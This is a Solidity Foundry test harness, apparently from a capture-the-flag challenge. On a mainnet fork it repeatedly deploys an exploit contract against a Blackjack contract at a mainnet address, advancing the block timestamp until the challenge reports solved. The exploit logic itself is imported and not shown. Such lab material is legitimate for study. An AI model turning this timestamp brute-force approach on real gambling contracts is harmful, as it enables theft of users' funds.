// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Challenge} from "./challenge/Challenge.sol";
import {Exploit} from "./Exploit.sol";

contract ExploitTest is Test {
    address playerAddr = makeAddr("player");
    address BLACKJACK = 0xA65D59708838581520511d98fB8b5d1F76A96cad;
    Challenge challenge;

    function setUp() public {
        vm.createSelectFork("mainnet");
        vm.deal(playerAddr, 1000 ether);

        payable(BLACKJACK).transfer(50 ether);
        console2.log("BLACKJACK balances", BLACKJACK.balance);
        challenge = new Challenge(BLACKJACK);
    }

    function test() public {
        vm.startPrank(playerAddr, playerAddr);

        for (uint256 i = 0; i < 100; i++) {
            vm.warp(block.timestamp + 1);
            try new Exploit{value: 5 ether}(BLACKJACK).exploit() {
                break;
            } catch {}
        }
        require(challenge.isSolved());

        vm.stopPrank();
    }
}
